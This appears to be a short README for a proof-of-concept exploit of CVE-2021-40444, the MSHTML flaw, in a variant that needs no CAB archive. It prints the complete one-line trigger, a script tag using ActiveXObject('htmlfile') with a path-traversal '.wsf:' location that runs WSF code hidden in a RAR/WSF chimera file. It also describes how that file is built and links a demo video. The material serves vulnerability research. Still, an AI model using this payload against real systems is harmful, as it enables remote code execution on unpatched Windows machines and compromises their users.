# CVE-2021-40444--CABless version
Update: Modified code so that we don´t need to rely on CAB archives
the file "index.html" that triggers payload execution will contain 1 line of code only, inside 'script' tag:
<script>new ActiveXObject('htmlfile').Script.location='.wsf:../../../Downloads/cabless.rar?.wsf';</script>
An article in PDF format is provided.

Update: link to video demo -> https://www.youtube.com/watch?v=V9XD3VboEcU

Note: The sample RAR file does NOT contain a Word document designed to exploit the vulnerability as I have taken as reference one of the PoCs posted on GitHub. Instead, it just have merged WSF and RAR data to demonstrate the path described in the article so the file can be parsed as RAR and WSF (chimera).
